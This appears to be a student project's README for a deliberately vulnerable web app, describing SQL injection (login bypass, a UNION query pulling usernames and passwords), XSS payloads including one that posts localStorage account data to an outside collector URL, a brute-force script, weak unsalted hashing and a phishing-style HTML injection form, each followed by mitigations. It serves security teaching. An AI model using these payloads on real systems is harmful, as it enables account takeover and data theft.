# SQL Injections
1. Um einen Hinweis darauf zu erlangen, wie die SQL-Query aussieht, welche für den Login verwendet wird kann man `"` in das login-feld eingeben. Aus dem Error, kann dann die Query entnommen werden.
2. Mit dem erlangten Wissen kann nun der Angriff durchgeführt werden, indem folgendes 
`" OR 1 = 1 # ` in das login-Username feld eingetragen wird. Hierdurch kann man sich einloggen ohne credentials zu nutzen.

### Union Attack 
1. Die verwendete Query, für die Suche, kann herausgefunden werden, indem man `%'` in das suchfeld postet. Man bekommt hier dann eine Fehlermeldung zurück welche einem einen Hinsweis darauf gibt, wie die SQL-Query aussieht die verwendet wird.
2. Für einen "UNION" befehl müssen die Select-Statements derer Ergebnisse zurück gegeben werden sollen, die gleiche Anzahl an Columns haben. Um herauszufinden wie viele columns in dem table (Thread Table) sind der von der Suchfeld-query aufgerufen wird kann folgende query verwendet werden: `%' ORDER BY 4-- `. Die Zahl sollte immer weiter eröht werden, bis ein Error zurück gegeben wird. Sobald das geschieht weiß man dass die verwendete Zahl minus Eins die Anzahl der Columns ist.
3. Weiß man nun also wie viele Columns in dem table enthalten sind kann man die query für die Union-Attack formulieren:
`%' UNION SELECT NULL, username, passw, NULL, NULL FROM Users -- `, wobei die die Anzahl der "NULL" + die Anzahl der gewollten column-names der vorher herausgefundenen Anzahl der Columns entsprechen muss. Das Ergebnis hieraus ist, dass man die normalen Ergebnisse der Such-Query mit dem Select-Statement für den Users Table verbindet um nicht nur die Threads von der Datenbank zurück zu bekommen, sondern eben auch die Ergebnisse aus dem Users Table. In unserem Fall würden wir also auch Ergebnisse aus den "username" und "passw" columns des Users Table zusammen mit den Threads zurück geliefert bekommen.

## Maßnahmen
Escaping and query values:
https://github.com/mysqljs/mysql#escaping-query-values (Placeholders: https://mariadb.com/kb/en/connector-nodejs-promise-api/)


# Cross-Site Scripting
Reflected XSS
Insert <script>alert();</script>
https://www.imperva.com/learn/application-security/reflected-xss-attacks/#:~:text=Reflected%20XSS%20attacks%2C%20also%20known,enables%20execution%20of%20malicious%20scripts.
https://www.youtube.com/watch?v=T0vxdqvW9fU&list=LL&index=3
```js
<script>alert(document.cookie); </script>
<img src="http://url.to.file.which/not.exist" onerror= document.body.innerHTML = "<h1>You got hacked</h1>">
<img 
  src="https://jnx.me/img/profile.jpg" 
  style="display:none" 
  onload="fetch('https://enj917gkdfyp.x.pipedream.net/', {method: 'POST', body: localStorage.getItem('account')})"
>
```

## Maßnahmen
https://v2.vuejs.org/v2/guide/security.html#:~:text=The%20most%20fundamental%20security%20rule%20when%20using%20Vue,during%20server-side%20rendering.%20An%20example%20of%20such%20usage%3A

https://www.npmjs.com/package/sanitize-html

# Brute-force attack
Is possible because we do not check how many requests have been sent by one user

To start the brute-force script navigate to the "Attacks" directory and preform the following command:

```
python -m pip install selenium
python brute-force.py -u admin -t http://localhost:8081/loginPage -p passwords.txt
```

## Maßnahmen
Using a rate limiter: https://www.npmjs.com/package/express-rate-limit

# Broken Encryption
Möglich wegen veraltetem Hashalgorythmus (SHA256) und weil kein Salt verwendet wird sind alle hashes deterministisch. Dadurch ist das verwenden eines Rainbowtables möglich.

## Maßnahmen
Using bcrypt for hashing passwords: https://en.wikipedia.org/wiki/Bcrypt

# HTML Injections
(Phishing)
```html
<h3>Please login to proceed</h3>
<form action=http://www.google.com>
Username:<br>
<input type="username" name="username"></br>
Password:<br>
<input type="password" name="password"></br>
<br>
<input type="submit" value="Login"></br>
```

## Maßnahmen
https://www.npmjs.com/package/sanitize-html